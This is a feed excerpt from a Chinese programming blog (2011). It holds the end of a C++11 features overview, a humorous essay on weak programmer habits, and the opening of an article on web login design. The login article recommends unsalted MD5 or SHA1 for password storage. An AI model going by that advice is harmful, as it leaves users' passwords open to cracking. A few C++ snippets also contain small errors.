    decltype(0) g;        // g 的类型是 int, 因为 0 是右值
}
</pre>
<p>如果auto 和 decltype 在一起使用会是什么样子？能看下面的示例，下面这个示例也是引入decltype的一个原因——让C++有能力写一个 “ <a title="Wrapper function" href="https://en.wikipedia.org/wiki/Wrapper_function">forwarding function</a> 模板”，</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template&lt; typename LHS, typename RHS&gt;
  auto AddingFunc(const LHS &amp;lhs, const RHS &amp;rhs) -&gt; decltype(lhs+rhs)
{return lhs + rhs;}
</pre>
<p>这个函数模板看起来相当费解，其用到了auto 和 decltype 来扩展了已有的模板技术的不足。怎么个不足呢？在上例中，我不知道AddingFunc会接收什么样类型的对象，这两个对象的 + 操作符返回的类型也不知道，老的模板函数无法定义AddingFunc返回值和这两个对象相加后的返回值匹配，所以，你可以使用上述的这种定义。</p>
<h4 class="color-programming">
<span class="ez-toc-section" id="%E7%BB%9F%E4%B8%80%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E8%AF%AD%E6%B3%95"></span>统一的初始化语法<span class="ez-toc-section-end"></span>
</h4>
<p>C/C++的初始化的方法比较，C++ 11 用大括号统一了这些初始化的方法。</p>
<p>比如：POD的类型。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int arr[4]={0,1,2,3};
struct tm today={0};</pre>
<p>关于POD相说两句，所谓POD就是<a href="https://en.wikipedia.org/wiki/Plain_Old_Data_Structures" target="_blank">Plain Old Data</a>，当class/struct是<em>极简的(trivial)</em>、属于<em>标准布局(standard-layout)</em>，以及他的所有非静态（non-static）成员都是POD时，会被视为POD。如：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct A { int m; }; // POD
struct B { ~B(); int m; }; // non-POD, compiler generated default ctor
struct C { C() : m() {}; ~C(); int m; }; // non-POD, default-initialising m</pre>
<p>POD的初始化有点怪，比如上例，new A; 和new A(); 是不一样的，对于其内部的m，前者没有被初始化，后者被初始化了（不同 的编译器行为不一样，VC++和GCC不一样）。而非POD的初始化，则都会被初始化。</p>
<p>从这点可以看出，C/C++的初始化问题很奇怪，所以，在C++ 2011版中就做了统一。原文作者给出了如下的示例：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">C c {0,0}; //C++11 only. 相当于: C c(0,0);

int* a = new int[3] { 1, 2, 0 }; /C++11 only

class X {
    int a[4];
    public:
        X() : a{1,2,3,4} {} //C++11, member array initializer
};</pre>
<p>容器的初始化：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">// C++11 container initializer
vector&lt;string&gt; vs={ "first", "second", "third"};
map singers =
{ {"Lady Gaga", "+1 (212) 555-7890"},
{"Beyonce Knowles", "+1 (212) 555-0987"}};</pre>
<p>还支持像Java一样的成员初始化：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class C
{
   int a=7; //C++11 only
 public:
   C();
};</pre>
<h4 class="color-programming">
<span class="ez-toc-section" id="Delete_%E5%92%8C_Default_%E5%87%BD%E6%95%B0"></span>Delete 和 Default 函数<span class="ez-toc-section-end"></span>
</h4>
<p>我们知道C++的编译器在你没有定义某些成员函数的时候会给你的类自动生成这些函数，比如，构造函数，拷贝构造，析构函数，赋值函数。有些时候，我们不想要这些函数，比如，构造函数，因为我们想做实现单例模式。传统的做法是将其声明成private类型。</p>
<p>在新的C++中引入了两个指示符，delete意为告诉编译器不自动产生这个函数，default告诉编译器产生一个默认的。原文给出了下面两个例子：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct A
{
    A()=default; //C++11
    virtual ~A()=default; //C++11
};</pre>
<p>再如delete</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct NoCopy
{
    NoCopy &amp; operator =( const NoCopy &amp; ) = delete;
    NoCopy ( const NoCopy &amp; ) = delete;
};
NoCopy a;
NoCopy b(a); //compilation error, copy ctor is deleted</pre>
<p>这里，我想说一下，为什么我们需要default？我什么都不写不就是default吗？不全然是，比如构造函数，因为只要你定义了一个构造函数，编译器就不会给你生成一个默认的了。所以，为了要让默认的和自定义的共存，才引入这个参数，如下例所示：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct SomeType
{
 SomeType() = default; // 使用编译器生成的默认构造函数
 SomeType(OtherType value);
};</pre>
<p>关于delete还有两个有用的地方是</p>
<p>1）让你的对象只能生成在栈内存上：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct NonNewable {
    void *operator new(std::size_t) = delete;
};</pre>
<p>2）阻止函数的其形参的类型调用：（若尝试以 double 的形参调用 <code>f()</code>，将会引发编译期错误， 编译器不会自动将 double 形参转型为 int 再调用<code>f()</code>，如果传入的参数是double，则会出现编译错误）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void f(int i);
 void f(double) = delete;</pre>
<h4 class="color-programming">
<span class="ez-toc-section" id="nullptr"></span>nullptr<span class="ez-toc-section-end"></span>
</h4>
<p>C/C++的NULL宏是个被有很多潜在BUG的宏。因为有的库把其定义成整数0，有的定义成 (void*)0。在C的时代还好。但是在C++的时代，这就会引发很多问题。你可以上网看看。这是为什么需要 <code>nullptr</code> 的原因。 <code>nullptr</code> 是强类型的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void f(int); //#1
void f(char *);//#2
//C++03
f(0); //二义性
//C++11
f(nullptr) //无二义性，调用f(char*)</pre>
<p><code>所以在新版中请以 nullptr</code> 初始化指针。</p>
<h4 class="color-programming">
<span class="ez-toc-section" id="%E5%A7%94%E6%89%98%E6%9E%84%E9%80%A0"></span>委托构造<span class="ez-toc-section-end"></span>
</h4>
<p>在以前的C++中，构造函数之间不能互相调用，所以，我们在写这些相似的构造函数里，我们会把相同的代码放到一个私有的成员函数中。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class SomeType {
private:
  int number;
  string name;
  SomeType( int i, string&amp;amp; s ) : number(i), name(s){}
public:
  SomeType( )               : SomeType( 0, "invalid" ){}
  SomeType( int i )         : SomeType( i, "guest" ){}
  SomeType( string&amp;amp; s ) : SomeType( 1, s ){ PostInit(); }
};</pre>
<p>但是，为了方便并不足让“委托构造”这个事出现，最主要的问题是，基类的构造不能直接成为派生类的构造，就算是基类的构造函数够了，派生类还要自己写自己的构造函数：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class BaseClass
{
public:
  BaseClass(int iValue);
};

class DerivedClass : public BaseClass
{
public:
  using BaseClass::BaseClass;
};</pre>
<p>上例中，派生类手动继承基类的构造函数， 编译器可以使用基类的构造函数完成派生类的构造。 而将基类的构造函数带入派生类的动作 无法选择性地部分带入， 所以，要不就是继承基类全部的构造函数，要不就是一个都不继承(不手动带入)。 此外，若牵涉到多重继承，从多个基类继承而来的构造函数不可以有相同的函数签名(signature)。 而派生类的新加入的构造函数也不可以和继承而来的基类构造函数有相同的函数签名，因为这相当于重复声明。（所谓函数签名就是函数的参数类型和顺序不）</p>
<h4 class="color-programming">
<span class="ez-toc-section" id="%E5%8F%B3%E5%80%BC%E5%BC%95%E7%94%A8%E5%92%8Cmove%E8%AF%AD%E4%B9%89"></span>右值引用和move语义<span class="ez-toc-section-end"></span>
</h4>
<p>在老版的C++中，临时性变量（称为右值”R-values”，位于赋值操作符之右）经常用作交换两个变量。比如下面的示例中的tmp变量。示例中的那个函数需要传递两个string的引用，但是在交换的过程中产生了对象的构造，内存的分配还有对象的拷贝构造等等动作，成本比较高。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void naiveswap(string &amp;amp;a, string &amp;amp;b)
{
 string temp = a;
 a=b;
 b=temp;
}</pre>
<p>C++ 11增加一个新的引用（reference）类型称作右值引用（R-value reference），标记为<tt>typename &amp;&amp;</tt>。他们能够以non-const值的方式传入，允许对象去改动他们。这项修正允许特定对象创造出move语义。</p>
<p>举例而言，上面那个例子中，string类中保存了一个动态内存分存的char*指针，如果一个string对象发生拷贝构造（如：函数返回），string类里的char*内存只能通过创建一个新的临时对象，并把函数内的对象的内存copy到这个新的对象中，然后销毁临时对象及其内存。<strong>这是原来C++性能上重点被批评的事</strong>。</p>
<p>能过右值引用，string的构造函数需要改成“move构造函数”，如下所示。这样一来，使得对某个<span style="font-family: monospace;">stirng</span>的右值引用可以单纯地从右值复制其内部C-style的指针到新的string，然后留下空的右值。这个操作不需要内存数组的复制，而且空的暂时对象的析构也不会释放内存。其更有效率。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class string
{
    string (string&amp;&amp;); //move constructor
    string&amp;&amp; operator=(string&amp;&amp;); //move assignment operator
};</pre>
<p>The C++11 STL中广泛地使用了右值引用和move语议。因此，很多算法和容器的性能都被优化了。</p>
<h4 class="color-programming">
<span class="ez-toc-section" id="C_11_STL_%E6%A0%87%E5%87%86%E5%BA%93"></span>C++ 11 STL 标准库<span class="ez-toc-section-end"></span>
</h4>
<p>C++ STL库在2003年经历了很大的整容手术 <a href="http://www.devsource.com/c/a/Languages/Grok-The-New-Features-in-Standard-C/">Library Technical Report 1</a> (TR1)。 TR1 中出现了很多新的容器类 (<code>unordered_set</code>, <code>unordered_map</code>, <code>unordered_multiset</code>, 和 <code>unordered_multimap</code>) 以及一些新的库支持诸如：正则表达式， tuples，函数对象包装，等等。 C++11 批准了 TR1 成为正式的C++标准，还有一些TR1 后新加的一些库，从而成为了新的C++ 11 STL标准库。这个库主要包含下面的功能：</p>
<h5 class="color-programming">
<span class="ez-toc-section" id="%E7%BA%BF%E7%A8%8B%E5%BA%93"></span>线程库<span class="ez-toc-section-end"></span>
</h5>
<p>这们就不多说了，以前的STL饱受线程安全的批评。现在好 了。C++ 11 支持线程类了。这将涉及两个部分：第一、设计一个可以使多个线程在一个进程中共存的内存模型；第二、为线程之间的交互提供支持。第二部分将由程序库提供支持。大家可以看看<a href="https://en.wikipedia.org/wiki/Futures_and_promises" target="_blank">promises and futures</a>，其用于对象的同步。 <a href="http://www.stdthread.co.uk/doc/headers/future/async.html">async()</a> 函数模板用于发起并发任务，而 <a href="http://www.devx.com/cplus/10MinuteSolution/37436">thread_local</a> 为线程内的数据指定存储类型。更多的东西，可以查看 Anthony Williams的 <a href="http://www.devx.com/SpecialReports/Article/38883">Simpler Multithreading in C++0x</a>.</p>
<h5 class="color-programming">
<span class="ez-toc-section" id="%E6%96%B0%E5%9E%8B%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88"></span>新型智能指针<span class="ez-toc-section-end"></span>
</h5>
<p>C++98 的知能指针是 <code>auto_ptr， 在C++ 11中被废弃了。</code>C++11  引入了两个指针类： <a href="http://www.informit.com/guides/content.aspx?g=cplusplus&amp;seqNum=239">shared_ptr</a> 和 <a href="http://www.informit.com/guides/content.aspx?g=cplusplus&amp;seqNum=400">unique_ptr</a>。 shared_ptr只是单纯的引用计数指针，<code>unique_ptr 是用来取代<code>auto_ptr</code></code>。 <code>unique_ptr</code> 提供 <code>auto_ptr</code> 大部份特性，唯一的例外是 <code>auto_ptr</code> 的不安全、隐性的左值搬移。不像 <code>auto_ptr</code>，<code>unique_ptr</code> 可以存放在 C++0x 提出的那些能察觉搬移动作的容器之中。</p>
<p>为什么要这么干？大家可以看看《More Effective C++》中对 auto_ptr的讨论。</p>
<h5 class="color-programming">
<span class="ez-toc-section" id="%E6%96%B0%E7%9A%84%E7%AE%97%E6%B3%95"></span>新的算法<span class="ez-toc-section-end"></span>
</h5>
<p>定义了一些新的算法： <code>all_of()</code>, <code>any_of()</code> 和 <code>none_of()。</code></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &amp;lt;algorithm&amp;gt;
//C++11 code
//are all of the elements positive?
all_of(first, first+n, ispositive()); //false
//is there at least one positive element?
any_of(first, first+n, ispositive());//true
// are none of the elements positive?
none_of(first, first+n, ispositive()); //false</pre>
<p>使用新的copy_n()算法，你可以很方便地拷贝数组。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &amp;lt;algorithm&amp;gt;
int source[5]={0,12,34,50,80};
int target[5];
//copy 5 elements from source to target
copy_n(source,5,target);</pre>
<p>使用 <code>iota()</code> 可以用来创建递增的数列。如下例所示：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">include &amp;lt;numeric&amp;gt;
int a[5]={0};
char c[3]={0};
iota(a, a+5, 10); //changes a to {10,11,12,13,14}
iota(c, c+3, 'a'); //{'a','b','c'} </pre>
<p>总之，看下来，C++11 还是很学院派，很多实用的东西还是没有，比如： XML，sockets，reflection，当然还有垃圾回收。看来要等到C++ 20了。呵呵。不过C++ 11在性能上还是很快。参看 Google’s <a href="http://www.itproportal.com/2011/06/07/googles-rates-c-most-complex-highest-performing-language/">benchmark tests</a>。原文还引用Stroustrup 的观点：C++11 是一门新的语言——一个更好的 C++。</p>
<p>如果把所有的改变都列出来，你会发现真多啊。我估计C++ Primer那本书的厚度要增加至少30%以上。C++的门槛会不会越来越高了呢？我不知道，但我个人觉得这门语言的确是变得越来越令人望而却步了。（想起了某人和我说的一句话——学技术真的是太累了，还是搞方法论好混些？）</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-08-19T08:43:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/5265.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 弱爆程序员的特征值 ]]></title>
<link>https://coolshell.cn/articles/5292.html</link>
<content><![CDATA[ 
<p>【<strong><span style="color: #cc0000;">感谢网友</span><a title="由 sumtec 发布" href="https://coolshell.cn/articles/author/sumtec" rel="author">sumtec</a><span style="color: #cc0000;">投递此文，很欢乐也有意思，与大家共勉</span></strong>】</p>
<p>首先说明：</p>
<p>1、以下特征是真实遇到过的，同事犯过的，乃至我自己也犯过的；<br>
2、为了剧情需要，某些例子进行了一些夸张修饰等演绎创作，如无雷同，请勿生气；<br>
3、如果你出现过以下症状之一，并不代表你就是弱爆了，但是如果你一直出现，乃至一说到这个大家就能联想到你，那么你就得小心了；<br>
4、如果你是集这几个的大乘者，恭喜你，你已经找到了离开这个行业的充足理由了。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%A5%BD%E4%BA%86%EF%BC%8C%E6%90%9E%E5%AE%9A%EF%BC%81" title="好了，搞定！">好了，搞定！</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E9%82%A3%E4%BC%B0%E8%AE%A1%E6%98%AF%E4%BB%96%E7%9A%84Bug" title="那估计是他的Bug">那估计是他的Bug</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%97%A0%E5%9B%BE%E6%97%A0%E7%9C%9F%E7%9B%B8%EF%BC%81" title="无图无真相！">无图无真相！</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%82%A3%E6%98%AF%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%81" title="那是个对象！">那是个对象！</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E9%9B%86%E5%A4%A7%E6%88%90%E8%80%85" title="集大成者">集大成者</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%A5%BD%E4%BA%86%EF%BC%8C%E6%90%9E%E5%AE%9A%EF%BC%81"></span>好了，搞定！<span class="ez-toc-section-end"></span>
</h4>
<p>“那个Bug解决了吗？”</p>
<p>“好了，搞定！”</p>
<p>“这么快？”</p>
<p>正当你非常欣喜的时候，就传来了噩耗：刚才还能编译成功的，就失败了。（好吧，我们的集成编译尚未成功配置上，理论上这种事情应该会被退回。）又或者能编译成功，但是呢，原来明明能起作用的一个下拉框，突然发神经的不起作用了。最隐蔽的莫过于，一切正常，但是当你看到代码的时候，你就晕厥过去了。比如我们曾经发现了一个Bug，简单说就是每次用户点击某个东西，就会执行下面的这段C#代码：</p>
<p><code data-enlighter-language="csharp" class="EnlighterJSRAW">controlPropertyPanel.PropertyChanged += this.UpdatePropertyOnChanged;</code></p>
<p>这个Bug很明显会导致速度越来越慢，因为同一个更新操作会被更新N次，并且这个N会越来越大。其实这个Bug已经够弱了，但是后来居然被修改为：</p>
<p><span id="more-5292"></span></p>
<p></p>
<pre data-enlighter-language="csharp" class="EnlighterJSRAW">controlPropertyPanel.PropertyChanged -= this.UpdatePropertyOnChanged;
controlPropertyPanel.PropertyChanged += this.UpdatePropertyOnChanged;</pre>
<p>这段代码能编译，能执行，但是就是弱爆了。因为这不仅仅没有从根本上去掉造成问题的逻辑，还会带来更多的困惑：为什么要先减后加呢？</p>
<p>这类特征，请大家看看有趣的《<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">各种流行的编程风格</a>》，我这个例子算是一种撞大运。我觉这吧，这类问题都是因为只想解决一些表面的东西为目的，完全不管底下的其它任何问题而造成的。</p>
<h4>
<span class="ez-toc-section" id="%E9%82%A3%E4%BC%B0%E8%AE%A1%E6%98%AF%E4%BB%96%E7%9A%84Bug"></span>那估计是他的Bug<span class="ez-toc-section-end"></span>
</h4>
<p>“这个问题为啥还没解决呢？”</p>
<p>“我觉得应该是他那里边的Bug，我调不了。”</p>
<p>“哦……”</p>
<p>这个“他”可以是某一位同事，或者前同事，或者微软，或者别的什么公司，再或者某个开源代码的作者。这些个我都遇到过，比如说是另一位现在在职的同事吧。当你告诉这位同事这个Bug似乎在他那儿，并且问问什么时候解决，他也许会很愧疚的立刻调试，可最后结果却仍然是开头对话主人翁的所写代码的问题。</p>
<p>再比如说是微软吧，那么对话可能就会包括：“啊，SilverLight真是烂，老是内存泄漏、崩溃等……”“是啊是啊！烂死了！早知道用Flash了。”又或者会说：“微软就是烂，Java就是好。”其实，我不想比较什么SilverLight还是Flash，.NET还是Java。因为在讨论这些问题之前，先最好想想，这真的是别人的错么？相信是其他人的错是一件很简单的事情，因为这样推脱之后你就可以啥都不做了，反正不是我的错。</p>
<p>如果真的发现了这是别人的Bug并证明了，那倒好说。但这种特征是一种纯粹的怀疑，并没有丝毫的证明。在仔细找了自己所有可能犯的错之后，如果你怀疑是别人的问题，那请求证一下。</p>
<h4>
<span class="ez-toc-section" id="%E6%97%A0%E5%9B%BE%E6%97%A0%E7%9C%9F%E7%9B%B8%EF%BC%81"></span>无图无真相！<span class="ez-toc-section-end"></span>
</h4>
<p>“楼主，无图无真相啊！”</p>
<p>“楼主，无代码无真相啊！”</p>
<p>“楼主，给翻译一下啊！”</p>
<p>据说Linus在别人询问Linux内存管理的一个什么问题时，回答道“Read the fxxxing source code”，很多时候我也有类似的冲动。我发现在信息发达的时代，不少人的阅读能力、动手能力都严重退化了。这些人最好就是你亲自来帮他把问题解决了，他才不想了解里面到底 发生了什么。这种问题体现在博客里面，就是寄希望于你写得图文并茂，图嘛最好花里胡哨同时言简而意概，文字嘛最好大段大段的代码。其实图不是重要的，只是为了好看，重点是代码，这样他一Copy就可以直接解决他们的问题了。</p>
<p>比方说，Silverlight里面没有各种图像格式的编码器，于是当你希望保存Jpg的时候怎么办呢？Google一下，发现原来有人写过一个FluxJpeg的编码器。下载下来一跑，唉还真能用哎。之后就直接签入，也不捎带看一下有没有什么问题，或者设计不合理的地方。（其实真的有，会很慢，因为有大量毫无必要的数组拷贝。）</p>
<p>又或者说，遇到了某个Bug，搜索一下发现，哎，还真有人遇到过，而且还有代码哎！把代码扒下来一跑，发现好像解决了，至于为什么就不管了。甚至还遇到过根本就不管解决不解决问题，反正代码扒下来了就签入了的。</p>
<p>再比如，写一篇博客讲解如何缩减.NET编译出来的文体大小，其中提到许多概念需要先阅读微软官方的一个<a href="https://download.microsoft.com/download/d/c/1/dc1b219f-3b11-4a05-9da3-2d0f98b20917/partition%20ii%20metadata.doc" target="_blank">文档</a>。结果，还是会有人回复说，你那个文章里面提到那么多的Blob，也不说说Blob里面都有什么，大概是很不满意吧。可是这个文档里面都有啊，难道就不能自己阅读一下？其实即便我连这个文档都没有给出，自己也应该有这个能力去进行思考，去动手寻找。</p>
<p>千万不要退化成一个啥都要别人给你嚼烂了才能够吞下去，吞下去也不会消化吸收的人。这样的人大概别人给的是大便，只要有代码无真相，也会照样吃下去的。若真如此，那你打算如何提高呢？</p>
<h4>
<span class="ez-toc-section" id="%E9%82%A3%E6%98%AF%E4%B8%AA%E5%AF%B9%E8%B1%A1%EF%BC%81"></span>那是个对象！<span class="ez-toc-section-end"></span>
</h4>
<p>“这个ExpressionVisitor，它是用来干什么的？”</p>
<p>“……”</p>
<p>“好吧，或者这么说，他是一个什么东西？”</p>
<p>“他是一个对象！”</p>
<p>“啊？”</p>
<p>“哦，是一个对象的实例。”</p>
<p>大概这样的回答，和那个微软工程师说“<a href="http://blog.oasisfeng.com/2007/09/21/experiencing-support-from-ms/">你在直升飞机上</a>”差不多——反正你也不能说是错的，但是就是没什么意义。其实不知道没啥问题，人又不是神，怎么可能都知道呢？不去仔细了解和学习问题也不严重，因为你可以改。但是当你习惯性的随便找一个绝对没错但又不说明任何问题的答案，甚至似是而非的东西来对付的时候，你就离弱爆的边缘很近了。</p>
<p>当然，上面的对话也许是比较极端的。一个稍弱一点的对话版本是：</p>
<p>“这个内存泄漏是怎么造成的呢？”</p>
<p>“嗯，会不会是图片放的位置不对呢？”</p>
<p>哈，还是很夸张对吧？没办法，写博客有时候需要夸张的文字，否则你无法理解我的意思是：有时候，大家会倾向于从自己的记忆中寻找一些相似的物品，然后选择相似度自认为比较高的东西出来当作答案，而全然不管两者之间的逻辑是否有哪怕那么一丝的关联。也许很多时候，我们确实需要从相似的东西开始，但请别把他当作终点。程序是需要严谨的逻辑的，所以你也必须非常严谨的去推演。</p>
<p>关于这类的问题真的太多太多了，比如我指着下面这段代码当中的红字：</p>
<p>var dictionary = new Dictionary&lt;string, string&gt;();<br>
dictionary<strong><span style="color: #ff0000;">[“someKey”]</span></strong> = “someValue”;</p>
<p>“这句话说明了什么？”</p>
<p>“说明dictionary是一个数组。”</p>
<h4>
<span class="ez-toc-section" id="%E9%9B%86%E5%A4%A7%E6%88%90%E8%80%85"></span>集大成者<span class="ez-toc-section-end"></span>
</h4>
<p>最后我举一个集大成者的例子，说，有个任务是要在SilverLight应用上面添加一个“收藏本站点”。好，怎么解决呢？网上一搜，发现有很多这样的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function AddBookmark(Url, LabeName) {
  if (document.all)
  {
    window.external.addFavorite(Url, LabeName);
  }
  else if (window.sidebar)
  {
    window.sidebar.addPanel(LabeName, Url, '');
  }
}</pre>
<p>然后直接扒下来就放上去了，通过某种方式在SilverLight中调用这段JavaScript，签入，搞定了！结果到了测试那边发现完全不能用，无论在IE6/7/8/9/10，还是在FireFox/Safari/Chrome上面，都不能使用。我问：</p>
<p>“这是什么原因呢？”</p>
<p>“不知道，反正浏览器报告没有权限，可能是浏览器的安全设置原因吧，或者操作系统的Bug，也可能是浏览器的某种Bug？”</p>
<p>“不可能啊？这些代码存在很多年了，要有问题早就能在网上搜索到了。”</p>
<p>“那也许是SilverLight调用的时候有什么安全问题。哎！SilverLight好烦啊！”</p>
<p>“那怎么还没有解决呢？”</p>
<p>“好，我马上解决它！”</p>
<p>很快，那段Javascript就变成了：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function AddBookmark(Url, LabeName) {
  try
  {
    if (document.all)
    {
      window.external.addFavorite(Url, LabeName);
    }
    else if (window.sidebar)
    {
      window.sidebar.addPanel(LabeName, Url, '');
    }
  }
  catch
  {
    alert("您的浏览器因为安全设置的问题无法收藏，请手动添加收藏！");
  }
}</pre>
<p>看到这样的代码，我彻底震惊了。亲自调试了一下，发现确实报告了一个“没有权限”的异常。但是，我还发现，那个Url参数的值是“www.adomainname.com\test\page.html”。那这不废话么！浏览器认为你要收藏的是一个本地硬盘上的路径，怎么可能在一个Internet Zone上允许收藏这种路径呢？我于是指着代码问：</p>
<p>“这个Url是什么？”</p>
<p>“是一个变量”</p>
<p>“啊？”</p>
<p>“哦，不对，是一个参数。”</p>
<p>你是否也有类似的经历呢？</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-08-23T10:04:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/5292.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 你会做Web上的用户登录功能吗？ ]]></title>
<link>https://coolshell.cn/articles/5353.html</link>
<content><![CDATA[ 
<p>Web上的用户登录功能应该是最基本的功能了，可是在我看过一些站点的用户登录功能后，我觉得很有必要写一篇文章教大家怎么来做用户登录功能。下面的文章告诉大家这个功能可能并没有你所想像的那么简单，这是一个关系到用户安全的功能，希望大家能从下面的文章中能知道什么样的方法才是一个好的用户登录功能。<span style="color: #cc0000;"><strong>以下内容，转载时请保持原文一致，并请注明作者和出处</strong></span>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%8F%A3%E4%BB%A4" title="用户名和口令">用户名和口令</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81" title="用户登录状态">用户登录状态</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%89%BE%E5%9B%9E%E5%8F%A3%E4%BB%A4%E7%9A%84%E5%8A%9F%E8%83%BD" title="找回口令的功能">找回口令的功能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8F%A3%E4%BB%A4%E6%8E%A2%E6%B5%8B%E9%98%B2%E5%AE%88" title="口令探测防守">口令探测防守</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" title="参考文章">参考文章</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%8F%A3%E4%BB%A4"></span>用户名和口令<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们先来说说用户名和口令的事。这并不是本站第一次谈论这个事了。<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html" target="_blank">如何管理自己的口令</a>让你知道怎么管理自己的口令，<a title="破解你的口令" href="https://coolshell.cn/articles/3801.html" target="_blank">破解你的口令</a>让你知道在现代这样速度的计算速度下，用穷举法破解你的口令可能会是一件很轻松的事。在这里我想告诉从开发者的角度上来做设计这个用户名和口令的事。下面一几件规则：</p>
<ul style="font-weight: bold;">
<li><span class="Apple-style-span" style="font-weight: normal;"><strong>限制用户输入一些非常容易被破解的口令</strong>。如什么qwert，123456, password之类，就像<a title="Twitter的禁用口令" href="https://coolshell.cn/articles/2451.html" target="_blank">twitter限制用户的口令</a>一样做一个口令的黑名单。另外，你可以限制用户口令的长度，是否有大小写，是否有数字，你可以用你的程序做一下校验。当然，这可能会让用户感到很不爽，所以，现在很多网站都提供了UX让用户知道他的口令强度是什么样的（比如<a title="另类UX让你输入强口令" href="https://coolshell.cn/articles/3877.html" target="_blank">这个有趣的UX</a>），这样可以让用户有一个选择，目的就是告诉用户——要想安全，先把口令设得好一点。</span></li>
</ul>
<ul style="font-weight: bold;">
<li><span class="Apple-style-span" style="font-weight: normal;"><strong>千万不要明文保存用户的口令</strong>。正如<a title="如何管理并设计你的口令" href="https://coolshell.cn/articles/2428.html" target="_blank">如何管理自己的口令</a>所说的一样，很多时候，用户都会用相同的ID相同的口令来登录很多网站。所以，如果你的网站明文保存的话，那么，如果你的数据被你的不良员工流传出去那对用户是灾难性的。所以，用户的口令一定要加密保存，最好是用不可逆的加密，如MD5或是SHA1之类的有hash算法的不可逆的加密算法。CSDN曾明文保存过用户的口令。（另，对于国内公司的品行以及有关部门的管理方式，我不敢保证国内网站以加密的方式保存你的口令。我觉得，做为一个有良知的人，我们应该加密保存用户的口令）</span></li>
</ul>
<div><span id="more-5353"></span></div>
<ul style="font-weight: bold;">
<li><span class="Apple-style-span" style="font-weight: normal;"><strong>是否让浏览器保存口令</strong>。我们有N多的方法可以不让浏览器保存用户名和口令。但是这可能对用户来说很不爽。因为在真实世界里谁也记得不住那么多的口令。很多用户可能会使用一些密码管理工具来保存密码，浏览器只是其中一种。是否让浏览器保存这个需要你做决定，重点是看一下你的系统的安全级别是否要求比较高，如果是的话，则不要让浏览器保存密码，并在网站明显的位置告诉用户——保存口令最安全的地方只有你的大脑。</span></li>
</ul>
<ul style="font-weight: bold;">
